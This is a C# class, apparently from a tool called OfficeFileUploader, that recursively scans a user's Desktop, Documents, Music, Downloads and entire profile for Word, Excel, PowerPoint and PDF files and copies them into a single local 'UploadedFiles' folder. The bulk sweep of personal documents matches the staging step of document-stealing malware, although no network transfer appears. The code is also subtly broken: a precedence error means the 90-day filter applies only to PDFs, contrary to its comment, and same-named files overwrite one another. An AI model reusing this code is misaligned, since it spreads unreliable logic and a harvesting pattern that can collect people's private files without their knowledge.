namespace OfficeFileUploader
{
    public class FileService
    {
        private readonly string[] _sourceFolders;
        private readonly string _uploadFolderPath;
        private readonly int _daysBack = 90; // מספר הימים לבדיקת תאריך שינוי

        public FileService()
        {
            _sourceFolders = new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads")
            };

            _uploadFolderPath = Path.Combine(Directory.GetCurrentDirectory(), "UploadedFiles");
            Directory.CreateDirectory(_uploadFolderPath); // יצירת תיקיית יעד

            Console.WriteLine($"Upload folder path set to: {_uploadFolderPath}");
        }

        public async Task CollectAndUploadFilesAsync()
        {
            foreach (var sourceFolderPath in _sourceFolders)
            {
                if (!Directory.Exists(sourceFolderPath))
                {
                    Console.WriteLine($"Source folder does not exist: {sourceFolderPath}");
                    continue;
                }

                try
                {
                    var files = Directory.EnumerateFiles(sourceFolderPath, "*.*", SearchOption.AllDirectories)
                        .Where(f => (f.EndsWith(".docx", StringComparison.OrdinalIgnoreCase) ||
                                     f.EndsWith(".xlsx", StringComparison.OrdinalIgnoreCase) ||
                                     f.EndsWith(".pptx", StringComparison.OrdinalIgnoreCase) ||
                                     f.EndsWith(".pdf", StringComparison.OrdinalIgnoreCase) &&
                                    File.GetLastWriteTime(f) >= DateTime.Now.AddDays(-_daysBack))); // רק קבצים ששונו לאחרונה

                    foreach (var filePath in files)
                    {
                        try
                        {
                            string fileName = Path.GetFileName(filePath);
                            string destinationPath = Path.Combine(_uploadFolderPath, fileName);

                            Console.WriteLine($"Uploading file: {filePath}");
                            await Task.Run(() => File.Copy(filePath, destinationPath, overwrite: true));
                            Console.WriteLine($"Uploaded file: {filePath}");
                        }
                        catch (UnauthorizedAccessException ex)
                        {
                            Console.WriteLine($"Access denied for file {filePath}: {ex.Message}");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error uploading file {filePath}: {ex.Message}");
                        }
                    }
                }
                catch (UnauthorizedAccessException ex)
                {
                    Console.WriteLine($"Access denied to directory {sourceFolderPath}: {ex.Message}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error scanning directory {sourceFolderPath}: {ex.Message}");
                }
            }
        }
    }
}
